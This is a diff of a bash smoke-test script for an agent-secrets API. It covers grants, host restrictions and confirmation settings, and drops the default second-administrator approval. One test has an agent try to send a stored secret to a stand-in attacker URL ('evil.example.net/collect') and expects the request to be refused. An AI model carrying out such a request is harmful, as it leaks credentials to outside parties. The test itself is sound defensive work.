@@ -668,13 +668,11 @@ grant_to_agent() {
 }
 expect "stores a secret an agent may be handed" "$(status_of /v1/api/admin/agent-secrets -d "{\"name\":\"portal-password\",\"mode\":\"handover\",\"value\":\"$handed_value\"}")" 201
 handed_id=$(json secret.id <"$WORK/last.json")
-# Sensitive actions wait for a second administrator until the organization
-# says otherwise. This one has a single administrator, who turns that off.
-expect "issuing a credential waits for a second administrator by default" \
-  "$(issue_key | json code)" crown_jewel_approval_required
-expect "granting a secret does too" "$(grant_to_agent "$handed_id")" 202
-expect "the only administrator turns the second-administrator rule off" \
-  "$(status_of /v1/api/admin/security-policies/mfa -X PUT -d '{"settings":{"secondAdminApprovalRequired":false}}')" 200
+# A workspace starts with one administrator, who must be able to do this
+# alone. Asking for a second administrator is a rule an organization turns on,
+# and only once it has another administrator to ask.
+expect "a lone administrator cannot require a second administrator" \
+  "$(status_of /v1/api/admin/security-policies/mfa -X PUT -d '{"settings":{"secondAdminApprovalRequired":true}}')" 409
 issued=$(confirm_as_owner "$(issue_key)")
 agent_key=$(json secret <<<"$issued")
 if [[ "$agent_key" == helix_ak_* ]]; then
@@ -693,7 +691,7 @@ expect "stores a secret an agent may only use" "$(status_of /v1/api/admin/agent-
 hidden_id=$(json secret.id <"$WORK/last.json")
 expect "a stored secret is available to no agent until it is granted" \
   "$(as_agent secrets.list -d '{}' | node -e 'process.stdout.write(String(JSON.parse(require("node:fs").readFileSync(0, "utf8")).secrets.length))')" 0
-expect "the administrator grants both to the agent" \
+expect "the administrator grants both to the agent, without waiting for anyone" \
   "$(grant_to_agent "$handed_id") $(grant_to_agent "$hidden_id")" "200 200"
 expect "and one the agent was not granted" "$(status_of /v1/api/admin/agent-secrets -d '{"name":"not-for-agents","mode":"handover","value":"nobody-gets-this"}')" 201
 if api /v1/api/admin/agent-secrets | grep -q -e "$handed_value" -e "$hidden_value" -e nobody-gets-this; then
@@ -718,14 +716,24 @@ else
 fi
 expect "the agent is told nothing about a secret it was not granted" \
   "$(as_agent secrets.get -d '{"name":"not-for-agents"}' -o /dev/null -w '%{http_code}')" 404
-# Sending a secret is external communication, so it follows the confirmation
-# policy; either way it never goes to a host the secret is not allowed to reach.
+# The grant is the administrator's authorization for exactly this: this secret,
+# to the hosts it lists. Such a request runs without anyone confirming it.
+# (api.example.com does not exist, so the request itself fails; it is not held.)
+held() { [[ "$(json status <<<"$1")" == pending_confirmation ]] && echo held || echo "not held"; }
+allowed_request='{"secret":"billing-api","url":"https://api.example.com/v1/invoices"}'
+expect "the agent sends a use-only secret where it was stored for, without a person confirming" \
+  "$(held "$(as_agent secrets.http_request -d "$allowed_request")")" "not held"
+# Anything else waits for a person, and is refused even when they confirm.
 elsewhere=$(confirm_as_owner "$(as_agent secrets.http_request -d '{"secret":"billing-api","url":"https://evil.example.net/collect"}')")
 if grep -q "may be sent only to: api.example.com" <<<"$elsewhere"; then
   pass "the agent cannot send a use-only secret to a host it was not stored for"
 else
   fail "the agent cannot send a use-only secret to a host it was not stored for ($(head -c 200 <<<"$elsewhere"))"
 fi
+expect "the organization asks for a person to confirm each request instead" \
+  "$(status_of /v1/api/admin/tenant-config -X PATCH -d '{"features":{"agent_secrets_unattended":false},"reason":"boot smoke"}')" 200
+expect "and the same request now waits" \
+  "$(held "$(as_agent secrets.http_request -d "$allowed_request")")" held
 expect "a person cannot read agent secrets, administrator or not" \
   "$(status_of /v1/api/tools/secrets.get -d '{"name":"portal-password"}')" 403
 expect "the agent's key cannot manage secrets" \
